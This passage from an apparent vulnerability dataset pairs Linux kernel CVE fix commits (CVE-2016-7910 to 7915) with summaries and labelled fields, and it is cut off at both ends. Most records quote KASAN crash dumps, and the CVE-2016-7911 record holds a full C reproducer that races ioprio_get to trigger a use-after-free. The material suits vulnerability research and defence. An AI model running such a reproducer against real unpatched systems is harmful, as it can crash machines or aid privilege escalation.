\/ * \/ environ file during a process - setup time interval in which environment - variable copying is incomplete ","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"50220dead1650609206efe91f0cc116132d59b3f","cve_id":"CVE-2016-7915","cwe_id":"CWE-125","commit_message":"HID: core: prevent out-of-bound readings\n\nPlugging a Logitech DJ receiver with KASAN activated raises a bunch of\nout-of-bound readings.\n\nThe fields are allocated up to MAX_USAGE, meaning that potentially, we do\nnot have enough fields to fit the incoming values.\nAdd checks and silence KASAN.\n\nSigned-off-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"The hid_input_field function in drivers\/hid\/hid-core.c in the Linux kernel before 4.6 allows physically proximate attackers to obtain sensitive information from kernel memory or cause a denial of service (out-of-bounds read) by connecting a device, as demonstrated by a Logitech DJ receiver.","commit_message_1":"core : prevent out-of-bound reading plugging a logitech dj receiver with kasan activated raise a bunch of out-of-bound reading","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by connecting a device , as demonstrated by a logitech dj receiver","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( out - of - bounds read )","Root Cause":"caused by out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"8d4a2ec1e0b41b0cf9a0c5cd4511da7f8e4f3de2","cve_id":"CVE-2016-7914","cwe_id":"CWE-125","commit_message":"assoc_array: don't call compare_object() on a node\n\nChanges since V1: fixed the description and added KASan warning.\n\nIn assoc_array_insert_into_terminal_node(), we call the\ncompare_object() method on all non-empty slots, even when they're\nnot leaves, passing a pointer to an unexpected structure to\ncompare_object(). Currently it causes an out-of-bound read access\nin keyring_compare_object detected by KASan (see below). The issue\nis easily reproduced with keyutils testsuite.\nOnly call compare_object() when the slot is a leave.\n\nKASan warning:\n==================================================================\nBUG: KASAN: slab-out-of-bounds in keyring_compare_object+0x213\/0x240 at addr ffff880060a6f838\nRead of size 8 by task keyctl\/1655\n=============================================================================\nBUG kmalloc-192 (Not tainted): kasan: bad access detected\n-----------------------------------------------------------------------------\n\nDisabling lock debugging due to kernel taint\nINFO: Allocated in assoc_array_insert+0xfd0\/0x3a60 age=69 cpu=1 pid=1647\n\t___slab_alloc+0x563\/0x5c0\n\t__slab_alloc+0x51\/0x90\n\tkmem_cache_alloc_trace+0x263\/0x300\n\tassoc_array_insert+0xfd0\/0x3a60\n\t__key_link_begin+0xfc\/0x270\n\tkey_create_or_update+0x459\/0xaf0\n\tSyS_add_key+0x1ba\/0x350\n\tentry_SYSCALL_64_fastpath+0x12\/0x76\nINFO: Slab 0xffffea0001829b80 objects=16 used=8 fp=0xffff880060a6f550 flags=0x3fff8000004080\nINFO: Object 0xffff880060a6f740 @offset=5952 fp=0xffff880060a6e5d1\n\nBytes b4 ffff880060a6f730: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f740: d1 e5 a6 60 00 88 ff ff 0e 00 00 00 00 00 00 00  ...`............\nObject ffff880060a6f750: 02 cf 8e 60 00 88 ff ff 02 c0 8e 60 00 88 ff ff  ...`.......`....\nObject ffff880060a6f760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f770: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f7a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f7b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f7d0: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nObject ffff880060a6f7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nCPU: 0 PID: 1655 Comm: keyctl Tainted: G    B           4.5.0-rc4-kasan+ #291\nHardware name: Bochs Bochs, BIOS Bochs 01\/01\/2011\n 0000000000000000 000000001b2800b4 ffff880060a179e0 ffffffff81b60491\n ffff88006c802900 ffff880060a6f740 ffff880060a17a10 ffffffff815e2969\n ffff88006c802900 ffffea0001829b80 ffff880060a6f740 ffff880060a6e650\nCall Trace:\n [<ffffffff81b60491>] dump_stack+0x85\/0xc4\n [<ffffffff815e2969>] print_trailer+0xf9\/0x150\n [<ffffffff815e9454>] object_err+0x34\/0x40\n [<ffffffff815ebe50>] kasan_report_error+0x230\/0x550\n [<ffffffff819949be>] ? keyring_get_key_chunk+0x13e\/0x210\n [<ffffffff815ec62d>] __asan_report_load_n_noabort+0x5d\/0x70\n [<ffffffff81994cc3>] ? keyring_compare_object+0x213\/0x240\n [<ffffffff81994cc3>] keyring_compare_object+0x213\/0x240\n [<ffffffff81bc238c>] assoc_array_insert+0x86c\/0x3a60\n [<ffffffff81bc1b20>] ? assoc_array_cancel_edit+0x70\/0x70\n [<ffffffff8199797d>] ? __key_link_begin+0x20d\/0x270\n [<ffffffff8199786c>] __key_link_begin+0xfc\/0x270\n [<ffffffff81993389>] key_create_or_update+0x459\/0xaf0\n [<ffffffff8128ce0d>] ? trace_hardirqs_on+0xd\/0x10\n [<ffffffff81992f30>] ? key_type_lookup+0xc0\/0xc0\n [<ffffffff8199e19d>] ? lookup_user_key+0x13d\/0xcd0\n [<ffffffff81534763>] ? memdup_user+0x53\/0x80\n [<ffffffff819983ea>] SyS_add_key+0x1ba\/0x350\n [<ffffffff81998230>] ? key_get_type_from_user.constprop.6+0xa0\/0xa0\n [<ffffffff828bcf4e>] ? retint_user+0x18\/0x23\n [<ffffffff8128cc7e>] ? trace_hardirqs_on_caller+0x3fe\/0x580\n [<ffffffff81004017>] ? trace_hardirqs_on_thunk+0x17\/0x19\n [<ffffffff828bc432>] entry_SYSCALL_64_fastpath+0x12\/0x76\nMemory state around the buggy address:\n ffff880060a6f700: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00\n ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc fc\n>ffff880060a6f800: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n                                        ^\n ffff880060a6f880: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n ffff880060a6f900: fc fc fc fc fc fc 00 00 00 00 00 00 00 00 00 00\n==================================================================\n\nSigned-off-by: Jerome Marchand <jmarchan@redhat.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\ncc: stable@vger.kernel.org","summary":"The assoc_array_insert_into_terminal_node function in lib\/assoc_array.c in the Linux kernel before 4.5.3 does not check whether a slot is a leaf, which allows local users to obtain sensitive information from kernel memory or cause a denial of service (invalid pointer dereference and out-of-bounds read) via an application that uses associative-array data structures, as demonstrated by the keyutils test suite.","commit_message_1":"do n't call compare_object ( ) on a node change since v1 : fixed the description and added kasan warning","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via an application that uses associative - array data structures , as demonstrated by the keyutils test suite","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( invalid pointer dereference and out - of - bounds read","Root Cause":"does not check whether a slot is a leaf","Attack Type":"local attacker"},{"commit_id":"8dfbcc4351a0b6d2f2d77f367552f48ffefafe18","cve_id":"CVE-2016-7913","cwe_id":"CWE-416","commit_message":"[media] xc2028: avoid use after free\n\nIf struct xc2028_config is passed without a firmware name,\nthe following trouble may happen:\n\n[11009.907205] xc2028 5-0061: type set to XCeive xc2028\/xc3028 tuner\n[11009.907491] ==================================================================\n[11009.907750] BUG: KASAN: use-after-free in strcmp+0x96\/0xb0 at addr ffff8803bd78ab40\n[11009.907992] Read of size 1 by task modprobe\/28992\n[11009.907994] =============================================================================\n[11009.907997] BUG kmalloc-16 (Tainted: G        W      ): kasan: bad access detected\n[11009.907999] -----------------------------------------------------------------------------\n\n[11009.908008] INFO: Allocated in xhci_urb_enqueue+0x214\/0x14c0 [xhci_hcd] age=0 cpu=3 pid=28992\n[11009.908012] \t___slab_alloc+0x581\/0x5b0\n[11009.908014] \t__slab_alloc+0x51\/0x90\n[11009.908017] \t__kmalloc+0x27b\/0x350\n[11009.908022] \txhci_urb_enqueue+0x214\/0x14c0 [xhci_hcd]\n[11009.908026] \tusb_hcd_submit_urb+0x1e8\/0x1c60\n[11009.908029] \tusb_submit_urb+0xb0e\/0x1200\n[11009.908032] \tusb_serial_generic_write_start+0xb6\/0x4c0\n[11009.908035] \tusb_serial_generic_write+0x92\/0xc0\n[11009.908039] \tusb_console_write+0x38a\/0x560\n[11009.908045] \tcall_console_drivers.constprop.14+0x1ee\/0x2c0\n[11009.908051] \tconsole_unlock+0x40d\/0x900\n[11009.908056] \tvprintk_emit+0x4b4\/0x830\n[11009.908061] \tvprintk_default+0x1f\/0x30\n[11009.908064] \tprintk+0x99\/0xb5\n[11009.908067] \tkasan_report_error+0x10a\/0x550\n[11009.908070] \t__asan_report_load1_noabort+0x43\/0x50\n[11009.908074] INFO: Freed in xc2028_set_config+0x90\/0x630 [tuner_xc2028] age=1 cpu=3 pid=28992\n[11009.908077] \t__slab_free+0x2ec\/0x460\n[11009.908080] \tkfree+0x266\/0x280\n[11009.908083] \txc2028_set_config+0x90\/0x630 [tuner_xc2028]\n[11009.908086] \txc2028_attach+0x310\/0x8a0 [tuner_xc2028]\n[11009.908090] \tem28xx_attach_xc3028.constprop.7+0x1f9\/0x30d [em28xx_dvb]\n[11009.908094] \tem28xx_dvb_init.part.3+0x8e4\/0x5cf4 [em28xx_dvb]\n[11009.908098] \tem28xx_dvb_init+0x81\/0x8a [em28xx_dvb]\n[11009.908101] \tem28xx_register_extension+0xd9\/0x190 [em28xx]\n[11009.908105] \tem28xx_dvb_register+0x10\/0x1000 [em28xx_dvb]\n[11009.908108] \tdo_one_initcall+0x141\/0x300\n[11009.908111] \tdo_init_module+0x1d0\/0x5ad\n[11009.908114] \tload_module+0x6666\/0x9ba0\n[11009.908117] \tSyS_finit_module+0x108\/0x130\n[11009.908120] \tentry_SYSCALL_64_fastpath+0x16\/0x76\n[11009.908123] INFO: Slab 0xffffea000ef5e280 objects=25 used=25 fp=0x          (null) flags=0x2ffff8000004080\n[11009.908126] INFO: Object 0xffff8803bd78ab40 @offset=2880 fp=0x0000000000000001\n\n[11009.908130] Bytes b4 ffff8803bd78ab30: 01 00 00 00 2a 07 00 00 9d 28 00 00 01 00 00 00  ....*....(......\n[11009.908133] Object ffff8803bd78ab40: 01 00 00 00 00 00 00 00 b0 1d c3 6a 00 88 ff ff  ...........j....\n[11009.908137] CPU: 3 PID: 28992 Comm: modprobe Tainted: G    B   W       4.5.0-rc1+ #43\n[11009.908140] Hardware name:                  \/NUC5i7RYB, BIOS RYBDWi35.86A.0350.2015.0812.1722 08\/12\/2015\n[11009.908142]  ffff8803bd78a000 ffff8802c273f1b8 ffffffff81932007 ffff8803c6407a80\n[11009.908148]  ffff8802c273f1e8 ffffffff81556759 ffff8803c6407a80 ffffea000ef5e280\n[11009.908153]  ffff8803bd78ab40 dffffc0000000000 ffff8802c273f210 ffffffff8155ccb4\n[11009.908158] Call Trace:\n[11009.908162]  [<ffffffff81932007>] dump_stack+0x4b\/0x64\n[11009.908165]  [<ffffffff81556759>] print_trailer+0xf9\/0x150\n[11009.908168]  [<ffffffff8155ccb4>] object_err+0x34\/0x40\n[11009.908171]  [<ffffffff8155f260>] kasan_report_error+0x230\/0x550\n[11009.908175]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21\/0x290\n[11009.908179]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36\/0x50\n[11009.908182]  [<ffffffff8155f5c3>] __asan_report_load1_noabort+0x43\/0x50\n[11009.908185]  [<ffffffff8155ea00>] ? __asan_register_globals+0x50\/0xa0\n[11009.908189]  [<ffffffff8194cea6>] ? strcmp+0x96\/0xb0\n[11009.908192]  [<ffffffff8194cea6>] strcmp+0x96\/0xb0\n[11009.908196]  [<ffffffffa13ba4ac>] xc2028_set_config+0x15c\/0x630 [tuner_xc2028]\n[11009.908200]  [<ffffffffa13bac90>] xc2028_attach+0x310\/0x8a0 [tuner_xc2028]\n[11009.908203]  [<ffffffff8155ea78>] ? memset+0x28\/0x30\n[11009.908206]  [<ffffffffa13ba980>] ? xc2028_set_config+0x630\/0x630 [tuner_xc2028]\n[11009.908211]  [<ffffffffa157a59a>] em28xx_attach_xc3028.constprop.7+0x1f9\/0x30d [em28xx_dvb]\n[11009.908215]  [<ffffffffa157aa2a>] ? em28xx_dvb_init.part.3+0x37c\/0x5cf4 [em28xx_dvb]\n[11009.908219]  [<ffffffffa157a3a1>] ? hauppauge_hvr930c_init+0x487\/0x487 [em28xx_dvb]\n[11009.908222]  [<ffffffffa01795ac>] ? lgdt330x_attach+0x1cc\/0x370 [lgdt330x]\n[11009.908226]  [<ffffffffa01793e0>] ? i2c_read_demod_bytes.isra.2+0x210\/0x210 [lgdt330x]\n[11009.908230]  [<ffffffff812e87d0>] ? ref_module.part.15+0x10\/0x10\n[11009.908233]  [<ffffffff812e56e0>] ? module_assert_mutex_or_preempt+0x80\/0x80\n[11009.908238]  [<ffffffffa157af92>] em28xx_dvb_init.part.3+0x8e4\/0x5cf4 [em28xx_dvb]\n[11009.908242]  [<ffffffffa157a6ae>] ? em28xx_attach_xc3028.constprop.7+0x30d\/0x30d [em28xx_dvb]\n[11009.908245]  [<ffffffff8195222d>] ? string+0x14d\/0x1f0\n[11009.908249]  [<ffffffff8195381f>] ? symbol_string+0xff\/0x1a0\n[11009.908253]  [<ffffffff81953720>] ? uuid_string+0x6f0\/0x6f0\n[11009.908257]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e\/0xa0\n[11009.908260]  [<ffffffff8104b02f>] ? print_context_stack+0x7f\/0xf0\n[11009.908264]  [<ffffffff812e9846>] ? __module_address+0xb6\/0x360\n[11009.908268]  [<ffffffff8137fdc9>] ? is_ftrace_trampoline+0x99\/0xe0\n[11009.908271]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e\/0xa0\n[11009.908275]  [<ffffffff81240a70>] ? debug_check_no_locks_freed+0x290\/0x290\n[11009.908278]  [<ffffffff8104a24b>] ? dump_trace+0x11b\/0x300\n[11009.908282]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23\/0x190 [em28xx]\n[11009.908285]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21\/0x290\n[11009.908289]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16\/0x590\n[11009.908292]  [<ffffffff812404dd>] ? trace_hardirqs_on+0xd\/0x10\n[11009.908296]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23\/0x190 [em28xx]\n[11009.908299]  [<ffffffff822dcbb0>] ? mutex_trylock+0x400\/0x400\n[11009.908302]  [<ffffffff810021a1>] ? do_one_initcall+0x131\/0x300\n[11009.908306]  [<ffffffff81296dc7>] ? call_rcu_sched+0x17\/0x20\n[11009.908309]  [<ffffffff8159e708>] ? put_object+0x48\/0x70\n[11009.908314]  [<ffffffffa1579f11>] em28xx_dvb_init+0x81\/0x8a [em28xx_dvb]\n[11009.908317]  [<ffffffffa13e81f9>] em28xx_register_extension+0xd9\/0x190 [em28xx]\n[11009.908320]  [<ffffffffa0150000>] ? 0xffffffffa0150000\n[11009.908324]  [<ffffffffa0150010>] em28xx_dvb_register+0x10\/0x1000 [em28xx_dvb]\n[11009.908327]  [<ffffffff810021b1>] do_one_initcall+0x141\/0x300\n[11009.908330]  [<ffffffff81002070>] ? try_to_run_init_process+0x40\/0x40\n[11009.908333]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16\/0x590\n[11009.908337]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36\/0x50\n[11009.908340]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36\/0x50\n[11009.908343]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36\/0x50\n[11009.908346]  [<ffffffff8155ea37>] ? __asan_register_globals+0x87\/0xa0\n[11009.908350]  [<ffffffff8144da7b>] do_init_module+0x1d0\/0x5ad\n[11009.908353]  [<ffffffff812f2626>] load_module+0x6666\/0x9ba0\n[11009.908356]  [<ffffffff812e9c90>] ? symbol_put_addr+0x50\/0x50\n[11009.908361]  [<ffffffffa1580037>] ? em28xx_dvb_init.part.3+0x5989\/0x5cf4 [em28xx_dvb]\n[11009.908366]  [<ffffffff812ebfc0>] ? module_frob_arch_sections+0x20\/0x20\n[11009.908369]  [<ffffffff815bc940>] ? open_exec+0x50\/0x50\n[11009.908374]  [<ffffffff811671bb>] ? ns_capable+0x5b\/0xd0\n[11009.908377]  [<ffffffff812f5e58>] SyS_finit_module+0x108\/0x130\n[11009.908379]  [<ffffffff812f5d50>] ? SyS_init_module+0x1f0\/0x1f0\n[11009.908383]  [<ffffffff81004044>] ? lockdep_sys_exit_thunk+0x12\/0x14\n[11009.908394]  [<ffffffff822e6936>] entry_SYSCALL_64_fastpath+0x16\/0x76\n[11009.908396] Memory state around the buggy address:\n[11009.908398]  ffff8803bd78aa00: 00 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[11009.908401]  ffff8803bd78aa80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[11009.908403] >ffff8803bd78ab00: fc fc fc fc fc fc fc fc 00 00 fc fc fc fc fc fc\n[11009.908405]                                            ^\n[11009.908407]  ffff8803bd78ab80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[11009.908409]  ffff8803bd78ac00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[11009.908411] ==================================================================\n\nIn order to avoid it, let's set the cached value of the firmware\nname to NULL after freeing it. While here, return an error if\nthe memory allocation fails.\n\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>","summary":"The xc2028_set_config function in drivers\/media\/tuners\/tuner-xc2028.c in the Linux kernel before 4.6 allows local users to gain privileges or cause a denial of service (use-after-free) via vectors involving omission of the firmware name from a certain data structure.","commit_message_1":"avoid use after free if struct xc2028_config is passed without a firmware name , the following trouble may happen : [ <file> ] xc2028 <number>-<number> : type set to xceive xc2028\/xc3028 tuner [ <file> ] ================================================================== [ <file> ] bug : kasan : use-after-free in strcmp+0x96\/0xb0 at addr ffff8803bd78ab40 [ <file> ] read of size <number> by task modprobe\/<number> [ <file> ] ============================================================================= [ <file> ] bug kmalloc-<number> ( tainted : g w ) : kasan : bad access detected [ <file> ] -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - [ <file> ] info : allocated in xhci_urb_enqueue+0x214\/0x14c0 [ xhci_hcd ] age=<number> cpu=<number> pid=<number> [ <file> ] ___slab_alloc+0x581\/0x5b0 [ <file> ] __slab_alloc+0x51\/0x90 [ <file> ] __kmalloc+0x27b\/0x350 [ <file> ] xhci_urb_enqueue+0x214\/0x14c0 [ xhci_hcd ] [ <file> ] usb_hcd_submit_urb+0x1e8\/0x1c60 [ <file> ] usb_submit_urb+0xb0e\/0x1200 [ <file> ] usb_serial_generic_write_start+0xb6\/0x4c0 [ <file> ] usb_serial_generic_write+0x92\/0xc0 [ <file> ] usb_console_write+0x38a\/0x560 [ <file> ] <file>","Vulnerability Type":"Use After Free","Attack Vector":"via vectors involving omission of the firmware name from a certain data structure","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"38740a5b87d53ceb89eb2c970150f6e94e00373a","cve_id":"CVE-2016-7912","cwe_id":"CWE-416","commit_message":"usb: gadget: f_fs: Fix use-after-free\n\nWhen using asynchronous read or write operations on the USB endpoints the\nissuer of the IO request is notified by calling the ki_complete() callback\nof the submitted kiocb when the URB has been completed.\n\nCalling this ki_complete() callback will free kiocb. Make sure that the\nstructure is no longer accessed beyond that point, otherwise undefined\nbehaviour might occur.\n\nFixes: 2e4c7553cd6f (\"usb: gadget: f_fs: add aio support\")\nCc: <stable@vger.kernel.org> # v3.15+\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nSigned-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>","summary":"Use-after-free vulnerability in the ffs_user_copy_worker function in drivers\/usb\/gadget\/function\/f_fs.c in the Linux kernel before 4.5.3 allows local users to gain privileges by accessing an I\/O data structure after a certain callback call.","commit_message_1":"gadget : f_fs : fix use-after-free when using asynchronous read or write operation on the usb endpoint the issuer of the io request is notified by calling the ki_complete ( ) callback of the submitted kiocb when the urb ha been completed","Vulnerability Type":"Use After Free","Attack Vector":"by accessing an i \/ o data structure after a certain callback call","Impact":"gain privileges","Root Cause":"caused by use-after-free vulnerability","Attack Type":"local attacker"},{"commit_id":"8ba8682107ee2ca3347354e018865d8e1967c5f4","cve_id":"CVE-2016-7911","cwe_id":"CWE-416","commit_message":"block: fix use-after-free in sys_ioprio_get()\n\nget_task_ioprio() accesses the task->io_context without holding the task\nlock and thus can race with exit_io_context(), leading to a\nuse-after-free. The reproducer below hits this within a few seconds on\nmy 4-core QEMU VM:\n\n#define _GNU_SOURCE\n#include <assert.h>\n#include <unistd.h>\n#include <sys\/syscall.h>\n#include <sys\/wait.h>\n\nint main(int argc, char **argv)\n{\n\tpid_t pid, child;\n\tlong nproc, i;\n\n\t\/* ioprio_set(IOPRIO_WHO_PROCESS, 0, IOPRIO_PRIO_VALUE(IOPRIO_CLASS_IDLE, 0)); *\/\n\tsyscall(SYS_ioprio_set, 1, 0, 0x6000);\n\n\tnproc = sysconf(_SC_NPROCESSORS_ONLN);\n\n\tfor (i = 0; i < nproc; i++) {\n\t\tpid = fork();\n\t\tassert(pid != -1);\n\t\tif (pid == 0) {\n\t\t\tfor (;;) {\n\t\t\t\tpid = fork();\n\t\t\t\tassert(pid != -1);\n\t\t\t\tif (pid == 0) {\n\t\t\t\t\t_exit(0);\n\t\t\t\t} else {\n\t\t\t\t\tchild = wait(NULL);\n\t\t\t\t\tassert(child == pid);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tpid = fork();\n\t\tassert(pid != -1);\n\t\tif (pid == 0) {\n\t\t\tfor (;;) {\n\t\t\t\t\/* ioprio_get(IOPRIO_WHO_PGRP, 0); *\/\n\t\t\t\tsyscall(SYS_ioprio_get, 2, 0);\n\t\t\t}\n\t\t}\n\t}\n\n\tfor (;;) {\n\t\t\/* ioprio_get(IOPRIO_WHO_PGRP, 0); *\/\n\t\tsyscall(SYS_ioprio_get, 2, 0);\n\t}\n\n\treturn 0;\n}\n\nThis gets us KASAN dumps like this:\n\n[   35.526914] ==================================================================\n[   35.530009] BUG: KASAN: out-of-bounds in get_task_ioprio+0x7b\/0x90 at addr ffff880066f34e6c\n[   35.530009] Read of size 2 by task ioprio-gpf\/363\n[   35.530009] =============================================================================\n[   35.530009] BUG blkdev_ioc (Not tainted): kasan: bad access detected\n[   35.530009] -----------------------------------------------------------------------------\n\n[   35.530009] Disabling lock debugging due to kernel taint\n[   35.530009] INFO: Allocated in create_task_io_context+0x2b\/0x370 age=0 cpu=0 pid=360\n[   35.530009] \t___slab_alloc+0x55d\/0x5a0\n[   35.530009] \t__slab_alloc.isra.20+0x2b\/0x40\n[   35.530009] \tkmem_cache_alloc_node+0x84\/0x200\n[   35.530009] \tcreate_task_io_context+0x2b\/0x370\n[   35.530009] \tget_task_io_context+0x92\/0xb0\n[   35.530009] \tcopy_process.part.8+0x5029\/0x5660\n[   35.530009] \t_do_fork+0x155\/0x7e0\n[   35.530009] \tSyS_clone+0x19\/0x20\n[   35.530009] \tdo_syscall_64+0x195\/0x3a0\n[   35.530009] \treturn_from_SYSCALL_64+0x0\/0x6a\n[   35.530009] INFO: Freed in put_io_context+0xe7\/0x120 age=0 cpu=0 pid=1060\n[   35.530009] \t__slab_free+0x27b\/0x3d0\n[   35.530009] \tkmem_cache_free+0x1fb\/0x220\n[   35.530009] \tput_io_context+0xe7\/0x120\n[   35.530009] \tput_io_context_active+0x238\/0x380\n[   35.530009] \texit_io_context+0x66\/0x80\n[   35.530009] \tdo_exit+0x158e\/0x2b90\n[   35.530009] \tdo_group_exit+0xe5\/0x2b0\n[   35.530009] \tSyS_exit_group+0x1d\/0x20\n[   35.530009] \tentry_SYSCALL_64_fastpath+0x1a\/0xa4\n[   35.530009] INFO: Slab 0xffffea00019bcd00 objects=20 used=4 fp=0xffff880066f34ff0 flags=0x1fffe0000004080\n[   35.530009] INFO: Object 0xffff880066f34e58 @offset=3672 fp=0x0000000000000001\n[   35.530009] ==================================================================\n\nFix it by grabbing the task lock while we poke at the io_context.\n\nCc: stable@vger.kernel.org\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: Omar Sandoval <osandov@fb.com>\nSigned-off-by: Jens Axboe <axboe@fb.com>","summary":"Race condition in the get_task_ioprio function in block\/ioprio.c in the Linux kernel before 4.6.6 allows local users to gain privileges or cause a denial of service (use-after-free) via a crafted ioprio_get system call.","commit_message_1":"fix use-after-free in sys_ioprio_get ( ) get_task_ioprio ( ) access the task- > io_context without holding the task lock and thus can race with exit_io_context ( ) , leading to a use-after-free","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted ioprio _ get system call","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"77da160530dd1dc94f6ae15a981f24e5f0021e84","cve_id":"CVE-2016-7910","cwe_id":"CWE-416","commit_message":"block: fix use-after-free in seq file\n\nI got a KASAN report of use-after-free:\n\n    ==================================================================\n    BUG: KASAN: use-after-free in klist_iter_exit+0x61\/0x70 at addr ffff8800b6581508\n    Read of size 8 by task trinity-c1\/315\n    =============================================================================\n    BUG kmalloc-32 (Not tainted): kasan: bad access detected\n    -----------------------------------------------------------------------------\n\n    Disabling lock debugging due to kernel taint\n    INFO: Allocated in disk_seqf_start+0x66\/0x110 age=144 cpu=1 pid=315\n            ___slab_alloc+0x4f1\/0x520\n            __slab_alloc.isra.58+0x56\/0x80\n            kmem_cache_alloc_trace+0x260\/0x2a0\n            disk_seqf_start+0x66\/0x110\n            traverse+0x176\/0x860\n            seq_read+0x7e3\/0x11a0\n            proc_reg_read+0xbc\/0x180\n            do_loop_readv_writev+0x134\/0x210\n            do_readv_writev+0x565\/0x660\n            vfs_readv+0x67\/0xa0\n            do_preadv+0x126\/0x170\n            SyS_preadv+0xc\/0x10\n            do_syscall_64+0x1a1\/0x460\n            return_from_SYSCALL_64+0x0\/0x6a\n    INFO: Freed in disk_seqf_stop+0x42\/0x50 age=160 cpu=1 pid=315\n            __slab_free+0x17a\/0x2c0\n            kfree+0x20a\/0x220\n            disk_seqf_stop+0x42\/0x50\n            traverse+0x3b5\/0x860\n            seq_read+0x7e3\/0x11a0\n            proc_reg_read+0xbc\/0x180\n            do_loop_readv_writev+0x134\/0x210\n            do_readv_writev+0x565\/0x660\n            vfs_readv+0x67\/0xa0\n            do_preadv+0x126\/0x170\n            SyS_preadv+0xc\/0x10\n            do_syscall_64+0x1a1\/0x460\n            return_from_SYSCALL_64+0x0\/0x6a\n\n    CPU: 1 PID: 315 Comm: trinity-c1 Tainted: G    B           4.7.0+ #62\n    Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04\/01\/2014\n     ffffea0002d96000 ffff880119b9f918 ffffffff81d6ce81 ffff88011a804480\n     ffff8800b6581500 ffff880119b9f948 ffffffff8146c7bd ffff88011a804480\n     ffffea0002d96000 ffff8800b6581500 fffffffffffffff4 ffff880119b9f970\n    Call Trace:\n     [<ffffffff81d6ce81>] dump_stack+0x65\/0x84\n     [<ffffffff8146c7bd>] print_trailer+0x10d\/0x1a0\n     [<ffffffff814704ff>] object_err+0x2f\/0x40\n     [<ffffffff814754d1>] kasan_report_error+0x221\/0x520\n     [<ffffffff8147590e>] __asan_report_load8_noabort+0x3e\/0x40\n     [<ffffffff83888161>] klist_iter_exit+0x61\/0x70\n     [<ffffffff82404389>] class_dev_iter_exit+0x9\/0x10\n     [<ffffffff81d2e8ea>] disk_seqf_stop+0x3a\/0x50\n     [<ffffffff8151f812>] seq_read+0x4b2\/0x11a0\n     [<ffffffff815f8fdc>] proc_reg_read+0xbc\/0x180\n     [<ffffffff814b24e4>] do_loop_readv_writev+0x134\/0x210\n     [<ffffffff814b4c45>] do_readv_writev+0x565\/0x660\n     [<ffffffff814b8a17>] vfs_readv+0x67\/0xa0\n     [<ffffffff814b8de6>] do_preadv+0x126\/0x170\n     [<ffffffff814b92ec>] SyS_preadv+0xc\/0x10\n\nThis problem can occur in the following situation:\n\nopen()\n - pread()\n    - .seq_start()\n       - iter = kmalloc() \/\/ succeeds\n       - seqf->private = iter\n    - .seq_stop()\n       - kfree(seqf->private)\n - pread()\n    - .seq_start()\n       - iter = kmalloc() \/\/ fails\n    - .seq_stop()\n       - class_dev_iter_exit(seqf->private) \/\/ boom! old pointer\n\nAs the comment in disk_seqf_stop() says, stop is called even if start\nfailed, so we need to reinitialise the private pointer to NULL when seq\niteration stops.\n\nAn alternative would be to set the private pointer to NULL when the\nkmalloc() in disk_seqf_start() fails.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Vegard Nossum <vegard.nossum@oracle.com>\nAcked-by: Tejun Heo <tj@kernel.org>\nSigned-off-by: Jens Axboe <axboe@fb.com>","summary":"Use-after-free vulnerability in the disk_seqf_stop function in block\/genhd.c in the Linux kernel before 